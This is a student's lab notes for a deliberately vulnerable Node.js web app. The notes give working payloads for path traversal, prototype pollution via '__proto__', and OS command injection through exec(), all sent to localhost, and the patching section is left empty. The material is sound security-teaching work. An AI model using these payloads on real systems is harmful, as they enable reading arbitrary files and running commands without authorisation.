# Web Security Lab - Notes

# Setup

1. Install Node.js.
2. `cd` into the `src` folder, and run `npm install`.
3. Run `node app.js`.
4. Go to `http://localhost:80` in your browser.

Alternatively, you can use Docker:

    docker-compose up -d
    open http://127.0.0.1:8083/

# Experiments

These challenges have three vulnerabilities: OS command injection, prototype pollution and path traversal. Your task is to find out what you can do with these vulnerabilities.


# Tasks 1-4:
To make the following requests, I build HTTP Requests using Powershell's Invoke-WebRequest and its associated 

1. Path Traversal Exploit:

   ```PowerShell
   $postParams = @{id="../../README.md"}
   Invoke-WebRequest -Uri http://localhost:80/img -Method GET -Body $postParams
   ```
   This example specifically hits this README, but you can use this to access further files on the user's system.

2. Prototype Pollution Exploit:
 ```
 POST: http://localhost/edit_note
 Body, JSON Format:
 {
		"id": "__proto__",
		"author": "{}",
		"raw": "{}"
}
 ```

3. OS Command Injection
```
POST: http://localhost/edit_note
Body, JSON Format:
{
		"id": "__proto__",
		"author": "ps aux | grep node > example.txt",
		"raw": "cat example.txt"
}
GET: http://localhost/status
```
What the above does pollutes the base object with these extra commands. When running status, the extra commands are put in the list and executed by exec(), which enact these benign commands and makes a file.
You can easily delete files you are not supposed to access.

4. Patching the Prototype Pollution:
